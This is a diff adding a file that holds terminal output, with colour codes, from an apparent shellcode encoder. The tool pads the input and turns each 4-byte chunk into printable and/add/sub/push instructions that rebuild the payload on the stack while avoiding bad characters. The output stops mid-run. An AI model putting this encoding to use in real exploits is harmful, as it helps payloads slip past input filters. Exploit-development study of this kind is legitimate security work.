@@ -1,0 +1,1299 @@
+Enter your shellcode: Enter shellcode variable name: [[91m![0m] Shellcode size is not divisible by 4
+[[92m+[0m] Padding shellcode with 2 NOPS..
+[[94m*[0m] Encoding [90904141]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x21\x50\x50[0m" ## add  eax, 0x50502121
+shellcode += "[37m\x05\x20\x20\x40\x40[0m" ## add  eax, 0x40402020
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [654b6f69]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x34\x37\x36\x33[0m" ## add  eax, 0x33363734
+shellcode += "[37m\x05\x34\x36\x25\x33[0m" ## add  eax, 0x33253634
+shellcode += "[37m\x05\x34\x35\x23\x32[0m" ## add  eax, 0x32233534
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [63537057]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x30\x32\x32[0m" ## add  eax, 0x32323033
+shellcode += "[37m\x05\x24\x40\x21\x31[0m" ## add  eax, 0x31214024
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [7a316f30]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x37\x21\x45[0m" ## add  eax, 0x45213721
+shellcode += "[37m\x05\x21\x36\x22\x34[0m" ## add  eax, 0x34223621
+shellcode += "[37m\x05\x21\x35\x21\x34[0m" ## add  eax, 0x34213521
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [42734345]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x22\x32\x21[0m" ## add  eax, 0x21322223
+shellcode += "[37m\x05\x22\x21\x41\x21[0m" ## add  eax, 0x21412122
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [77736b4d]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x27\x36\x32\x33[0m" ## add  eax, 0x33323627
+shellcode += "[37m\x05\x26\x35\x41\x44[0m" ## add  eax, 0x44413526
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [65565542]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x33\x33\x33[0m" ## add  eax, 0x33333321
+shellcode += "[37m\x05\x21\x22\x23\x32[0m" ## add  eax, 0x32232221
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [504b6b59]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x36\x26\x30[0m" ## add  eax, 0x30263635
+shellcode += "[37m\x05\x24\x35\x25\x20[0m" ## add  eax, 0x20253524
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [504d6a76]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x35\x27\x30[0m" ## add  eax, 0x30273533
+shellcode += "[37m\x05\x43\x35\x26\x20[0m" ## add  eax, 0x20263543
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6c513633]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x22\x23\x31\x36[0m" ## add  eax, 0x36312322
+shellcode += "[37m\x05\x11\x13\x20\x36[0m" ## add  eax, 0x36201311
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4c57755a]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x33\x33\x26[0m" ## add  eax, 0x26333335
+shellcode += "[37m\x05\x25\x42\x24\x26[0m" ## add  eax, 0x26244225
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4f6b4d6d]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x36\x36\x36\x37[0m" ## add  eax, 0x37363636
+shellcode += "[37m\x05\x36\x26\x35\x26[0m" ## add  eax, 0x26352636
+shellcode += "[37m\x05\x34\x24\x33\x25[0m" ## add  eax, 0x25332434
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4d6f357a]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x45\x23\x37\x36[0m" ## add  eax, 0x36372345
+shellcode += "[37m\x05\x34\x23\x36\x26[0m" ## add  eax, 0x26362334
+shellcode += "[37m\x05\x34\x22\x35\x24[0m" ## add  eax, 0x24352234
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [766d5863]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x34\x37\x33[0m" ## add  eax, 0x33373432
+shellcode += "[37m\x05\x31\x24\x36\x43[0m" ## add  eax, 0x43362431
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4a4a7234]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x22\x31\x25\x25[0m" ## add  eax, 0x25253122
+shellcode += "[37m\x05\x12\x41\x25\x25[0m" ## add  eax, 0x25254112
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4e446e69]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x37\x22\x27[0m" ## add  eax, 0x27223735
+shellcode += "[37m\x05\x34\x37\x22\x27[0m" ## add  eax, 0x27223734
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4b4f756a]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x43\x37\x36[0m" ## add  eax, 0x36374335
+shellcode += "[37m\x05\x34\x33\x26\x25[0m" ## add  eax, 0x25263334
+shellcode += "[37m\x05\x34\x32\x25\x23[0m" ## add  eax, 0x23253234
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6f493075]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x43\x21\x34\x37[0m" ## add  eax, 0x37342143
+shellcode += "[37m\x05\x33\x21\x24\x36[0m" ## add  eax, 0x36242133
+shellcode += "[37m\x05\x32\x21\x24\x35[0m" ## add  eax, 0x35242132
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6d47776f]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x44\x34\x36[0m" ## add  eax, 0x36344437
+shellcode += "[37m\x05\x36\x33\x23\x36[0m" ## add  eax, 0x36233336
+shellcode += "[37m\x05\x35\x33\x23\x34[0m" ## add  eax, 0x34233335
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [48345843]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x22\x34\x22\x24[0m" ## add  eax, 0x24223422
+shellcode += "[37m\x05\x21\x24\x12\x24[0m" ## add  eax, 0x24122421
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [50466f39]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x24\x37\x33\x31[0m" ## add  eax, 0x31333724
+shellcode += "[37m\x05\x24\x36\x23\x31[0m" ## add  eax, 0x31233624
+shellcode += "[37m\x05\x24\x35\x23\x21[0m" ## add  eax, 0x21233524
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [46307672]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x33\x20\x23[0m" ## add  eax, 0x23203331
+shellcode += "[37m\x05\x41\x43\x10\x23[0m" ## add  eax, 0x23104341
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4e707079]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x30\x30\x27[0m" ## add  eax, 0x27303035
+shellcode += "[37m\x05\x44\x40\x40\x27[0m" ## add  eax, 0x27404044
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [596d5558]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x34\x33\x37\x35[0m" ## add  eax, 0x35373334
+shellcode += "[37m\x05\x24\x22\x36\x24[0m" ## add  eax, 0x24362224
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6f69766f]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x43\x34\x37[0m" ## add  eax, 0x37344337
+shellcode += "[37m\x05\x36\x33\x34\x36[0m" ## add  eax, 0x36343336
+shellcode += "[37m\x05\x35\x33\x34\x35[0m" ## add  eax, 0x35343335
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4f676c5a]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x36\x34\x37[0m" ## add  eax, 0x37343635
+shellcode += "[37m\x05\x34\x35\x33\x26[0m" ## add  eax, 0x26333534
+shellcode += "[37m\x05\x24\x34\x33\x25[0m" ## add  eax, 0x25333424
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [39544852]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x24\x32\x25[0m" ## add  eax, 0x25322431
+shellcode += "[37m\x05\x21\x24\x22\x14[0m" ## add  eax, 0x14222421
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [56705350]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x30\x32\x30\x33[0m" ## add  eax, 0x33303230
+shellcode += "[37m\x05\x20\x21\x40\x23[0m" ## add  eax, 0x23402120
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [66335630]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x20\x33\x22\x33[0m" ## add  eax, 0x33223320
+shellcode += "[37m\x05\x10\x23\x11\x33[0m" ## add  eax, 0x33112310
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4e703636]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x23\x30\x27[0m" ## add  eax, 0x27302323
+shellcode += "[37m\x05\x13\x13\x40\x27[0m" ## add  eax, 0x27401313
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [46703666]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x23\x30\x23[0m" ## add  eax, 0x23302333
+shellcode += "[37m\x05\x33\x13\x40\x23[0m" ## add  eax, 0x23401333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [76423636]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x23\x21\x33[0m" ## add  eax, 0x33212323
+shellcode += "[37m\x05\x13\x13\x21\x43[0m" ## add  eax, 0x43211313
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [70324451]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x22\x21\x30[0m" ## add  eax, 0x30212231
+shellcode += "[37m\x05\x20\x22\x11\x40[0m" ## add  eax, 0x40112220
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [74733073]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x20\x32\x32[0m" ## add  eax, 0x32322032
+shellcode += "[37m\x05\x41\x10\x41\x42[0m" ## add  eax, 0x42411041
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [46487046]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x30\x24\x23[0m" ## add  eax, 0x23243023
+shellcode += "[37m\x05\x23\x40\x24\x23[0m" ## add  eax, 0x23244023
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [44764470]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x30\x22\x33\x22[0m" ## add  eax, 0x22332230
+shellcode += "[37m\x05\x40\x22\x43\x22[0m" ## add  eax, 0x22432240
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [4d4c3153]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x21\x26\x27[0m" ## add  eax, 0x27262132
+shellcode += "[37m\x05\x21\x10\x26\x26[0m" ## add  eax, 0x26261021
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [61564c77]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x26\x33\x31[0m" ## add  eax, 0x31332633
+shellcode += "[37m\x05\x44\x26\x23\x30[0m" ## add  eax, 0x30232644
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [54475451]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x32\x23\x32[0m" ## add  eax, 0x32233231
+shellcode += "[37m\x05\x20\x22\x24\x22[0m" ## add  eax, 0x22242220
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [774b7671]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x33\x26\x33[0m" ## add  eax, 0x33263331
+shellcode += "[37m\x05\x40\x43\x25\x44[0m" ## add  eax, 0x44254340
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6d697249]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x25\x31\x35\x37[0m" ## add  eax, 0x37353125
+shellcode += "[37m\x05\x24\x41\x34\x36[0m" ## add  eax, 0x36344124
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [36464951]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x25\x23\x23[0m" ## add  eax, 0x23232531
+shellcode += "[37m\x05\x20\x24\x23\x13[0m" ## add  eax, 0x13232420
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [32627a61]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x31\x35\x31\x21[0m" ## add  eax, 0x21313531
+shellcode += "[37m\x05\x30\x45\x31\x11[0m" ## add  eax, 0x11314530
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [565a5136]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x31\x35\x33[0m" ## add  eax, 0x33353123
+shellcode += "[37m\x05\x13\x20\x25\x23[0m" ## add  eax, 0x23252013
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [47713776]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x23\x31\x23[0m" ## add  eax, 0x23312333
+shellcode += "[37m\x05\x43\x14\x40\x24[0m" ## add  eax, 0x24401443
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [7732336d]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x22\x21\x33[0m" ## add  eax, 0x33212237
+shellcode += "[37m\x05\x36\x11\x11\x44[0m" ## add  eax, 0x44111136
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [596d5045]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x23\x30\x37\x35[0m" ## add  eax, 0x35373023
+shellcode += "[37m\x05\x22\x20\x36\x24[0m" ## add  eax, 0x24362022
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [74614d42]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x21\x27\x31\x32[0m" ## add  eax, 0x32312721
+shellcode += "[37m\x05\x21\x26\x30\x42[0m" ## add  eax, 0x42302621
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [53535873]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x32\x34\x32\x32[0m" ## add  eax, 0x32323432
+shellcode += "[37m\x05\x41\x24\x21\x21[0m" ## add  eax, 0x21212441
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [45396f49]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x34\x37\x24\x33[0m" ## add  eax, 0x33243734
+shellcode += "[37m\x05\x24\x36\x24\x23[0m" ## add  eax, 0x23243624
+shellcode += "[37m\x05\x24\x35\x24\x22[0m" ## add  eax, 0x22243524
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [5670726d]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x37\x31\x30\x33[0m" ## add  eax, 0x33303137
+shellcode += "[37m\x05\x36\x41\x40\x23[0m" ## add  eax, 0x23404136
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [35587078]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x34\x30\x34\x23[0m" ## add  eax, 0x23343034
+shellcode += "[37m\x05\x44\x40\x24\x12[0m" ## add  eax, 0x12244044
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [48724c7a]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x35\x26\x31\x24[0m" ## add  eax, 0x24312635
+shellcode += "[37m\x05\x45\x26\x41\x24[0m" ## add  eax, 0x24412645
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [55326866]..
+[[92m+[0m] No bad character found, using default encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x33\x34\x21\x33[0m" ## add  eax, 0x33213433
+shellcode += "[37m\x05\x33\x34\x11\x22[0m" ## add  eax, 0x22113433
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6e626f79]..
+[[91m![0m] Possible bad character found, using alterantive encoder..
+shellcode += "[37m\x25\x4A\x4D\x4E\x55[0m" ## and  eax, 0x554e4d4a
+shellcode += "[37m\x25\x35\x32\x31\x2A[0m" ## and  eax, 0x2a313235
+shellcode += "[37m\x05\x44\x37\x32\x36[0m" ## add  eax, 0x36323744
+shellcode += "[37m\x05\x34\x36\x31\x35[0m" ## add  eax, 0x35313634
+shellcode += "[37m\x05\x34\x35\x32\x36[0m" ## add  eax, 0x36323534
+shellcode += "[37m\x2D\x33\x33\x33\x33[0m" ## sub  eax, 0x33333333
+shellcode += "[37m\x50[0m"                 ## push eax
+[[94m*[0m] Encoding [6c766431]..
+[[92m+[0m] No bad character found, using default encoder..
